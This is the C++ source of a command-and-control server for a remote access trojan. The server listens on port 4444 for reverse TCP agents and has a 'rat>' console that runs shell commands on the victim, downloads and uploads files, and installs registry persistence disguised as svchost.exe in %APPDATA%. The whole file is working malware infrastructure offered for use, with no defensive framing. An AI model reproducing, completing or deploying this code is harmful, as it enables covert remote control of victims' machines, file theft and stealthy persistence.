// language: C++17, file: server.cpp, target: Linux (C2 side)
// C2 server — listen for reverse TCP agent, interactive CLI
//
// build: g++ -std=c++17 -O2 -o server server.cpp
// usage: ./server [port]  (default: 4444)
//
// commands at the rat> prompt:
//   shell <cmd>               execute shell command on agent
//   download <remote_path>    pull file from agent to CWD
//   upload <local> <remote>   push local file to agent path
//   persist                   install HKCU registry persistence + copy to %APPDATA%\Microsoft\svchost.exe
//   exit                      send exit, terminate agent

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstdio>
#include <cstdint>
#include <cstring>
#include <string>
#include <vector>
#include <fstream>
#include <iostream>
#include <sstream>

enum : uint32_t {
    MSG_CMD      = 0x01,
    MSG_OUTPUT   = 0x02,
    MSG_DOWNLOAD = 0x03,
    MSG_FILE     = 0x04,
    MSG_UPLOAD   = 0x05,
    MSG_PERSIST  = 0x06,
    MSG_STATUS   = 0x07,
    MSG_EXIT     = 0xFF
};

static bool send_all(int fd, const void* buf, size_t len) {
    const char* p = static_cast<const char*>(buf);
    while (len) {
        ssize_t r = write(fd, p, len);
        if (r <= 0) return false;
        p += r; len -= r;
    }
    return true;
}

static bool recv_all(int fd, void* buf, size_t len) {
    char* p = static_cast<char*>(buf);
    while (len) {
        ssize_t r = read(fd, p, len);
        if (r <= 0) return false;
        p += r; len -= r;
    }
    return true;
}

static bool send_msg(int fd, uint32_t type, const void* data, uint32_t len) {
    uint32_t hdr[2] = { htonl(type), htonl(len) };
    if (!send_all(fd, hdr, 8)) return false;
    return len == 0 || send_all(fd, data, len);
}

static bool recv_msg(int fd, uint32_t& type, std::vector<uint8_t>& data) {
    uint32_t hdr[2];
    if (!recv_all(fd, hdr, 8)) return false;
    type = ntohl(hdr[0]);
    uint32_t len = ntohl(hdr[1]);
    if (len > 64u * 1024 * 1024) return false;
    data.resize(len);
    return len == 0 || recv_all(fd, data.data(), len);
}

static void session(int agent) {
    char peer[INET_ADDRSTRLEN];
    sockaddr_in addr{};
    socklen_t al = sizeof(addr);
    getpeername(agent, reinterpret_cast<sockaddr*>(&addr), &al);
    inet_ntop(AF_INET, &addr.sin_addr, peer, sizeof(peer));
    printf("[+] agent connected from %s\n", peer);

    std::string line;
    while (true) {
        printf("rat> ");
        fflush(stdout);
        if (!std::getline(std::cin, line)) break;
        if (line.empty()) continue;

        std::istringstream ss(line);
        std::string cmd;
        ss >> cmd;

        if (cmd == "exit") {
            send_msg(agent, MSG_EXIT, nullptr, 0);
            break;

        } else if (cmd == "shell") {
            std::string rest;
            std::getline(ss >> std::ws, rest);
            if (!send_msg(agent, MSG_CMD, rest.data(),
                          static_cast<uint32_t>(rest.size()))) break;
            uint32_t type;
            std::vector<uint8_t> resp;
            if (!recv_msg(agent, type, resp)) break;
            printf("%.*s\n", static_cast<int>(resp.size()), resp.data());

        } else if (cmd == "download") {
            std::string remote;
            ss >> remote;
            if (!send_msg(agent, MSG_DOWNLOAD, remote.data(),
                          static_cast<uint32_t>(remote.size()))) break;
            uint32_t type;
            std::vector<uint8_t> resp;
            if (!recv_msg(agent, type, resp)) break;
            if (type == MSG_FILE) {
                size_t sl = remote.rfind('\\');
                std::string local = (sl == std::string::npos) ? remote : remote.substr(sl + 1);
                std::ofstream f(local, std::ios::binary);
                f.write(reinterpret_cast<char*>(resp.data()), resp.size());
                printf("[+] saved %zu bytes -> %s\n", resp.size(), local.c_str());
            } else {
                printf("[-] %.*s\n", static_cast<int>(resp.size()), resp.data());
            }

        } else if (cmd == "upload") {
            std::string local_path, remote_path;
            ss >> local_path >> remote_path;
            std::ifstream f(local_path, std::ios::binary);
            if (!f) { printf("[-] local file not found\n"); continue; }
            std::vector<uint8_t> fdata((std::istreambuf_iterator<char>(f)), {});

            uint32_t plen    = static_cast<uint32_t>(remote_path.size());
            uint32_t nplen   = htonl(plen);
            std::vector<uint8_t> payload(4 + plen + fdata.size());
            memcpy(payload.data(),            &nplen,             4);
            memcpy(payload.data() + 4,        remote_path.data(), plen);
            memcpy(payload.data() + 4 + plen, fdata.data(),       fdata.size());

            if (!send_msg(agent, MSG_UPLOAD, payload.data(),
                          static_cast<uint32_t>(payload.size()))) break;
            uint32_t type;
            std::vector<uint8_t> resp;
            if (!recv_msg(agent, type, resp)) break;
            printf("%.*s\n", static_cast<int>(resp.size()), resp.data());

        } else if (cmd == "persist") {
            if (!send_msg(agent, MSG_PERSIST, nullptr, 0)) break;
            uint32_t type;
            std::vector<uint8_t> resp;
            if (!recv_msg(agent, type, resp)) break;
            printf("%.*s\n", static_cast<int>(resp.size()), resp.data());

        } else if (cmd == "help") {
            printf("  shell <cmd>               execute command on agent\n"
                   "  download <remote_path>    pull file from agent\n"
                   "  upload <local> <remote>   push file to agent\n"
                   "  persist                   install HKCU registry persistence\n"
                   "  exit                      terminate agent process\n");
        } else {
            printf("unknown (help for list)\n");
        }
    }

    close(agent);
    printf("[-] session closed\n");
}

int main(int argc, char* argv[]) {
    uint16_t port = argc > 1 ? static_cast<uint16_t>(atoi(argv[1])) : 4444;

    int srv = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    sockaddr_in addr{};
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(port);
    addr.sin_addr.s_addr = INADDR_ANY;
    bind(srv, reinterpret_cast<sockaddr*>(&addr), sizeof(addr));
    listen(srv, 1);

    printf("[*] listening on 0.0.0.0:%u\n", port);

    while (true) {
        int agent = accept(srv, nullptr, nullptr);
        if (agent < 0) continue;
        session(agent);
    }
}
